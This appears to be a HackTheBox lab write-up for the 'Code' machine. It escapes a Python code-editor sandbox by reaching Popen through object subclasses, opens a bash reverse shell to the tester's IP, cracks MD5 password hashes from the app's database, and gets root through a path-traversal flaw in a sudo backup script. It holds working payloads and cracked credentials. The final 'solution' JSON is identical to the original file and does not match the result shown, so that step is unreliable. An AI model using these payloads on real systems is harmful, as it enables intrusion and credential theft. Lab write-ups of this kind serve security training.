Easy Linux Box

## Recon
nmap
```Bash
┌─[us-vip-2]─[10.10.14.2]─[gntsqid@htb-1p7vgdsbjq]─[~]
└──╼ [★]$ sudo nmap -T5 --min-rate=1500  code.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 18:30 CDT
Nmap scan report for code.htb (10.10.11.62)
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
┌─[us-vip-2]─[10.10.14.2]─[gntsqid@htb-1p7vgdsbjq]─[~]
└──╼ [★]$ sudo nmap -T5 --min-rate=1500 -sU code.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 18:30 CDT
Nmap scan report for code.htb (10.10.11.62)
Host is up (0.13s latency).
Not shown: 993 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
1053/udp  closed remote-as
5060/udp  closed sip
16674/udp closed unknown
17321/udp closed unknown
32770/udp closed sometimes-rpc4
38615/udp closed unknown
41081/udp closed unknown
```

finding...\
looks like flask:
```Bash
┌─[us-vip-2]─[10.10.14.2]─[gntsqid@htb-1p7vgdsbjq]─[~]
└──╼ [★]$ curl -i http://code.htb:5000
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Mon, 16 Jun 2025 23:37:22 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 3435
Vary: Cookie

<!-- index -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Python Code Editor</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
    <link rel="stylesheet" href="/static/css/styles.css">
</head>
<body>
<div id="header">
    <div>
        <button id="run-button">Run</button>
        <button id="save-button">Save</button>
    </div>
    <div class="auth-links">
        
            <a href="/register">Register</a>
            <a href="/login">Login</a>
        
        <a href="#" id="about-link">About</a>
        
    </div>
</div>

<div class="container">
    <div id="editor">print("Hello, world!")</div>
    <div id="output"></div>
</div>

<div id="about-modal">
    <div id="about-modal-content">
        <h2>About Code</h2>
        <p>
            Welcome to Code, your go-to Python code editor! Code is designed to provide a seamless and intuitive experience for writing and running Python code directly in your browser.
        </p>
        <button id="about-close">Close</button>
    </div>
</div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
        // Load the Ace editor modes and themes
        ace.config.set('basePath', 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/');
        var editor = ace.edit("editor");
        editor.session.setMode("ace/mode/python");
        editor.setTheme("ace/theme/monokai");

	$.ajaxSetup({
            xhrFields: {
                withCredentials: true
            }
        });

        function runCode() {
            var code = editor.getValue();
            $.post('/run_code', {code: code}, function(data) {
                document.getElementById('output').textContent = data.output;
            });
        }

        function loadCode(codeId) {
            $.get('/load_code/' + codeId, function(data) {
                editor.setValue(data.code, -1);
            });
        }

        document.getElementById('run-button').addEventListener('click', runCode);
        document.getElementById('save-button').addEventListener('click', function() {
            var code = editor.getValue();
            var name = prompt("Please enter the name for this script:");
            if (name) {
                $.post('/save_code', {code: code, name: name}, function(response) {
                    alert(response.message);
                });
            }
        });

        // About modal functionality
        document.getElementById('about-link').addEventListener('click', function(event) {
            event.preventDefault();
            document.getElementById('about-modal').style.display = 'flex';
        });

        document.getElementById('about-close').addEventListener('click', function() {
            document.getElementById('about-modal').style.display = 'none';
        });

        // Check if code_id is provided in the URL
        var urlParams = new URLSearchParams(window.location.search);
        var codeId = urlParams.get('code_id');
        if (codeId) {
            loadCode(codeId);
        }
        document.getElementById('output').textContent = 'Click "Run" to execute code.';
    </script>
</body>
</html>
```


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/7daa1b50-b5ea-40b0-87ef-dd54c9c3b492) returned 404 during the image audit (2026-10-08).


## Python
This will show all available sub-classes
```Python
print([x.__name__ for x in ().__class__.__base__.__subclasses__()])
```
we found popen is one! Awesome!\
Let's try to do something with it:
```Python
for i, x in enumerate((()).__class__.__base__.__subclasses__()):
    if "Popen" in str(x):
        print(i, x)
```
argh restricted...mmmm...\
maybe try obfuscating...\
```Python
for i, x in enumerate((()).__class__.__base__.__subclasses__()):
    try:
        if hasattr(x, '__name__') and x.__name__.endswith('pen') and hasattr(x, '__init__') and hasattr(x.__init__, '__globals__'):
            print(i, x.__name__)
    except:
        pass
```


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/29800e9d-b986-4845-addd-9873cef02bd1) returned 404 during the image audit (2026-10-08).


Woot!\
Now we can directly target popen by id!
```Python
cls = ().__class__.__base__.__subclasses__()[317]
print(cls(["id"], stdout=-1).communicate())
```
result!
```Bash
(b'uid=1001(app-production) gid=1001(app-production) groups=1001(app-production)\n', None)
```

we can edit the query a bit to get a reverse shell...\
first we listen:
```Bash
nc -lvnp 4444
```
then payload
```Python
cls = ().__class__.__base__.__subclasses__()[317]
cls(["bash","-c","bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"], stdout=-1).communicate()
```


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/dbdd2d81-df70-4428-8e2d-aa92640a4502) returned 404 during the image audit (2026-10-08).


Success!!

Let us stabilize
```Bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Explore!
```Bash
app-production@code:~/app$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app-production:x:1001:1001:,,,:/home/app-production:/bin/bash
martin:x:1000:1000:,,,:/home/martin:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

something something look for setuid binaries:
```Bash
app-production@code:~/app$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/umount
/usr/bin/at
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

wait a minute...we are in a flask server!
```Bash
app-production@code:~/app$ ls -lah
ls -lah
total 32K
drwxrwxr-x 6 app-production app-production 4.0K Feb 20 12:10 .
drwxr-x--- 5 app-production app-production 4.0K Sep 16  2024 ..
-rw-r--r-- 1 app-production app-production 5.2K Feb 20 12:07 app.py
drwxr-xr-x 2 app-production app-production 4.0K Feb 20 12:32 instance
drwxr-xr-x 2 app-production app-production 4.0K Feb 20 12:07 __pycache__
drwxr-xr-x 3 app-production app-production 4.0K Aug 27  2024 static
drwxr-xr-x 2 app-production app-production 4.0K Feb 20 10:36 templates
```
sure enough app.py!
```Bash
app-production@code:~/app$ cat app.py
cat app.py
from flask import Flask, render_template,render_template_string, request, jsonify, redirect, url_for, session, flash
from flask_sqlalchemy import SQLAlchemy
import sys
import io
import os
import hashlib

app = Flask(__name__)
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)
    codes = db.relationship('Code', backref='user', lazy=True)


class Code(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)
    name = db.Column(db.String(100), nullable=False)

    def __init__(self, user_id, code, name):
        self.user_id = user_id
        self.code = code
        self.name = name

@app.route('/')
def index():
    code_id = request.args.get('code_id')
    return render_template('index.html', code_id=code_id)


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        existing_user = User.query.filter_by(username=username).first()
        if existing_user:
            flash('User already exists. Please choose a different username.')
        else:
            new_user = User(username=username, password=password)
            db.session.add(new_user)
            db.session.commit()
            flash('Registration successful! You can now log in.')
            return redirect(url_for('login'))
    
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        user = User.query.filter_by(username=username, password=password).first()
        if user:
            session['user_id'] = user.id
            flash('Login successful!')
            return redirect(url_for('index'))
        else:
            flash('Invalid credentials. Please try again.')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    flash('You have been logged out.')
    return redirect(url_for('index'))

@app.route('/run_code', methods=['POST'])
def  run_code():
    code = request.form['code']
    old_stdout = sys.stdout
    redirected_output = sys.stdout = io.StringIO()
    try:
        for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write', 'subprocess', '__import__', '__builtins__']:
            if keyword in code.lower():
                return jsonify({'output': 'Use of restricted keywords is not allowed.'})
        exec(code)
        output = redirected_output.getvalue()
    except Exception as e:
        output = str(e)
    finally:
        sys.stdout = old_stdout
    return jsonify({'output': output})

@app.route('/load_code/<int:code_id>')
def load_code(code_id):
    if 'user_id' not in session:
        flash('You must be logged in to view your codes.')
        return redirect(url_for('login'))
    code = Code.query.get_or_404(code_id)
    if code.user_id != session['user_id']:
        flash('You do not have permission to view this code.')
        return redirect(url_for('codes'))
    return jsonify({'code': code.code})


@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' not in session:
        return jsonify({'message': 'You must be logged in to save code.'}), 401
    user_id = session['user_id']
    code = request.form.get('code')
    name = request.form.get('name')
    if not code or not name:
        return jsonify({'message': 'Code and name are required.'}), 400
    new_code = Code(user_id=user_id, code=code, name=name)
    db.session.add(new_code)
    db.session.commit()
    return jsonify({'message': 'Code saved successfully!'})


@app.route('/codes', methods=['GET', 'POST'])
def codes():

    if 'user_id' not in session:
        flash('You must be logged in to view your codes.')
        return redirect(url_for('login'))

    user_id = session['user_id']
    codes = Code.query.filter_by(user_id=user_id).all()

    if request.method == 'POST':
        code_id = request.form.get('code_id')
        code = Code.query.get(code_id)
        if code and code.user_id == user_id:
            db.session.delete(code)
            db.session.commit()
            flash('Code deleted successfully!')
        else:
            flash('Code not found or you do not have permission to delete it.')
        return redirect(url_for('codes'))     
    return render_template('codes.html',codes=codes)


@app.route('/about')
def about():
    return render_template('about.html')

if __name__ == '__main__':
    if not os.path.exists('database.db'):
        with app.app_context():
            db.create_all()
    app.run(host='0.0.0.0', port=5000)
```

we found ourselves a database bois!\
and look who we get the credentials of now...
```Bash
app-production@code:~/app$ cat instance/database.db
cat instance/database.db
�O"�O�P�tablecodecodeCREATE TABLE code (
	id INTEGER NOT NULL, 
	user_id INTEGER NOT NULL, 
	code TEXT NOT NULL, 
	name VARCHAR(100) NOT NULL, 
	PRIMARY KEY (id), 
	FOREIGN KEY(user_id) REFERENCES user (id)
)�*�7tableuseruserCREATE TABLE user (
	id INTEGER NOT NULL, 
	username VARCHAR(80) NOT NULL, 
	password VARCHAR(80) NOT NULL, 
	PRIMARY KEY (id), 
	UNIQUE (username)
���QQR*Mmartin3de6f30c4a09c27fc71932bfc68474be/#Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3
�����
���&$n#	Cprint("Functionality test")Testapp-production@code:~/app$
```
```Bash
echo "3de6f30c4a09c27fc71932bfc68474be" > martin.hash
echo "759b74ce43947f5f4c91aeddc3e5bad3" >> martin.hash
```
```Bash
hashcat -m 0 -a 0 martin.hash /usr/share/wordlists/rockyou.txt --force
```
```Bash
759b74ce43947f5f4c91aeddc3e5bad3:development              
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster 
```


## USER EXPLOIT
> FIRST FLAG FOUND
```Bash
app-production@code:~/app$ cat ../user.txt
cat ../user.txt
567ce4922f2006eed931ae15b8daef36
```


```Bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
martin@code:~$ cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```
the json file\
> /home/martin/backup/task.json
```json 
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```


> SCRATCH THAT...GOT THE SOLUTION
>> [walktrhrough](https://medium.com/@hamzaanwarrao/code-htb-walkthrough-aea6b48e92c5)

```JSON
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```
```Bash
sudo /usr/bin/backy.sh /home/martin/backups/task.json
```
```Bash
martin@code:~$ mkdir tmp_root_end
martin@code:~$ tar -xjf backups/code_var_.._root_2025_June.tar.bz2 -C tmp_root_end
martin@code:~$ ls tmp_root_end/
root
martin@code:~$ cat tmp_root_end/root/
.bash_history     .bashrc           .cache/           .local/           .profile          .python_history   root.txt          scripts/          .selected_editor  .sqlite_history   .ssh/             
martin@code:~$ cat tmp_root_end/root/root.txt 
712198b9709ec1d432f14de898c470be
```
> ROOT HASH
```Bash
712198b9709ec1d432f14de898c470be
```


